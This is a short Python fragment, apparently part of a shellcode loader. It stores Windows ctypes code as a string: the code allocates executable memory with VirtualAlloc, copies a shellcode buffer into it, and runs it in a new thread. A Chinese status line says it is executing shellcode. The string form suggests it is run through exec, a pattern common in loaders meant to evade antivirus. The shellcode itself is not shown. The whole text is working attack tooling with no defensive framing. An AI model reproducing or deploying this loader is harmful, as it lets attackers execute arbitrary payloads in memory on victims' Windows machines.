exec_code = '''
import ctypes
print("[*] 执行 shellcode...")
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
page = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(page), ctypes.create_string_buffer(bytes(shellcode)), len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(page), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
'''